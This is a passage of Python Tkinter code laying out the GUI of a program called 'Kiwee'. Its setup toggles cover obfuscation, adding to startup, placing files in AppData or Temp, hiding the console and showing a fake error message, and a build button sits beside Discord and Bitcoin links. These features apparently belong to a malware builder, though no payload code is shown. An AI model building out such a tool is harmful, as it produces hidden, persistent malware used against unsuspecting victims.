        if self.obfuscate == False:
            self.obfuscateb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.obfuscatelol)
            self.obfuscateb.place(x=353,y=338)
        else:
            self.obfuscateb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.obfuscatelol)
            self.obfuscateb.place(x=353,y=338)
        if self.addstartup== False:
            self.addstartupb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.addstartuplol)
            self.addstartupb.place(x=353,y=378)
        else:
            self.addstartupb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.addstartuplol)
            self.addstartupb.place(x=353,y=378)
        if self.appdata== False:
            self.appdatab = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.bindappdata)
            self.appdatab.place(x=648,y=61)
        else:
            self.appdatab = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.bindappdata)
            self.appdatab.place(x=648,y=61)
        if self.temp== False:
            self.tempb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.bindtemp)
            self.tempb.place(x=648,y=105)
        else:
            self.tempb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.bindtemp)
            self.tempb.place(x=648,y=105)
        self.googleshare = Entry(window,text='c',font=('SeoulHangang',10),bg='#989898', fg='#299D00',width=29,borderwidth=0)
        self.googleshare.place(x=511, y=182)
        if self.noconsole== False:
            self.noconsoleb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.noconsolelol)
            self.noconsoleb.place(x=694,y=286)
        else:
            self.noconsoleb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.noconsolelol)
            self.noconsoleb.place(x=694,y=286)
        if self.errormsg== False:
            self.errormsgb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.errormsglol)
            self.errormsgb.place(x=694,y=329)
        else:
            self.errormsgb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.errormsglol)
            self.errormsgb.place(x=694,y=329)
        self.errormsge = Entry(window,text='d',font=('SeoulHangang',10),bg='#989898', fg='#299D00',width=16,borderwidth=0)
        self.errormsge.place(x=602, y=374)
    def compile(self):
        bgg = Label(window, image=bg2, borderwidth=0)
        bgg.place(x=166, y=0)
        self.gotosetup = Button(window, image=setupbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
        self.gotocompiler = Button(window, image=compilerbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.compile)
        self.gotocompiler.place(x=-3,y=241)
        self.gotosettings = Button(window, image=settingbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.settings)
        self.gotosettings.place(x=-3,y=304)
        self.gotoabout = Button(window, image=aboutbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.about)
        self.gotoabout.place(x=-3,y=367)
        self.gotocompiler = Button(window, image=compilerbu2,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.compile)
        self.gotocompiler.place(x=-3,y=241)
        #
        build = Button(window, image=buildbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.verifyshit)
        build.place(x=395,y=389)
    def settings(self):
        bgg = Label(window, image=bg3, borderwidth=0)
        bgg.place(x=166, y=0)
        self.gotosetup = Button(window, image=setupbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
        self.gotocompiler = Button(window, image=compilerbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.compile)
        self.gotocompiler.place(x=-3,y=241)
        self.gotosettings = Button(window, image=settingbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.settings)
        self.gotosettings.place(x=-3,y=304)
        self.gotoabout = Button(window, image=aboutbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.about)
        self.gotoabout.place(x=-3,y=367)
        self.gotosettings = Button(window, image=settingbu2,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.settings)
        self.gotosettings.place(x=-3,y=304)
        #
        installreq = Button(window, image=installbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.installrequirements)
        installreq.place(x=454,y=133)
        installpy = Button(window, image=installbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.installpython)
        installpy.place(x=454,y=187)
        checkpyver = Button(window, image=checkbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.checkversion)
        checkpyver.place(x=454,y=275)
    def about(self):
        bgg = Label(window, image=bg4, borderwidth=0)
        bgg.place(x=166, y=0)
        self.gotosetup = Button(window, image=setupbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
        self.gotocompiler = Button(window, image=compilerbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.compile)
        self.gotocompiler.place(x=-3,y=241)
        self.gotosettings = Button(window, image=settingbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.settings)
        self.gotosettings.place(x=-3,y=304)
        self.gotoabout = Button(window, image=aboutbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.about)
        self.gotoabout.place(x=-3,y=367)
        self.gotoabout = Button(window, image=aboutbu2,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.about)
        self.gotoabout.place(x=-3,y=367)
        #
        instalol = Button(window, image=insta,bg='#242424',borderwidth=0, activebackground="#242424",command=self.instagram)
        instalol.place(x=216,y=340)
        discolol = Button(window, image=disco,bg='#242424',borderwidth=0, activebackground="#242424",command=self.discord)
        discolol.place(x=282,y=342)
        btclol = Button(window, image=btc,bg='#242424',borderwidth=0, activebackground="#242424",command=self.bitcoin)
        btclol.place(x=374,y=337)
Kiwee()
window.mainloop()